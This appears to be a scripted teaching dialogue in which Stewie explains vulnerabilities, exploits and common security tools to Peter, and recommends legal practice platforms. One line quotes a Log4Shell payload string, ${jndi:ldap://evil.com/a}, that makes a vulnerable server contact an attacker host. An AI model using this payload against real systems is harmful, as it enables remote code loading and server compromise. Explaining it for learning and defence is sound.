timeline.speaker: Peter
timeline.text: So finding a vulnerability means you can hack a system?

timeline.speaker: Stewie
timeline.text: Not quite. A vulnerability is a weakness. An exploit is the code that takes advantage of that weakness. You need to turn the vulnerability into a working exploit, which is often harder than it sounds.

timeline.speaker: Stewie
timeline.text: Depends on the vulnerability. Log4Shell was trivially exploitable - you just sent a string like ${jndi:ldap://evil.com/a} and the server would connect to your attacker-controlled server. Millions of systems were compromised within hours.

timeline.speaker: Stewie
timeline.text: But most exploits are harder. Buffer overflows require understanding memory layouts, stack protection mechanisms, and ASLR. You often need to chain multiple vulnerabilities.

timeline.speaker: Stewie
timeline.text: Metasploit is the most well-known exploitation framework. It has thousands of exploits for known vulnerabilities. But real attackers write custom exploits for zero-day vulnerabilities.

timeline.speaker: Stewie
timeline.text: For web applications, tools like Burp Suite let you intercept and modify HTTP requests. SQLMap automates SQL injection exploitation.

timeline.speaker: Stewie
timeline.text: On your own systems and in authorized CTF competitions, absolutely. Platforms like Hack The Box and TryHackMe provide legal environments to practice. Never exploit systems you don't own without permission.

timeline.speaker: Stewie
timeline.text: Interview tip: explain how you'd exploit a specific vulnerability category. Understanding exploitation helps you write better defenses and prioritize patches.

timeline.speaker: Peter
timeline.text: I'm signing up for Hack The Box right now.
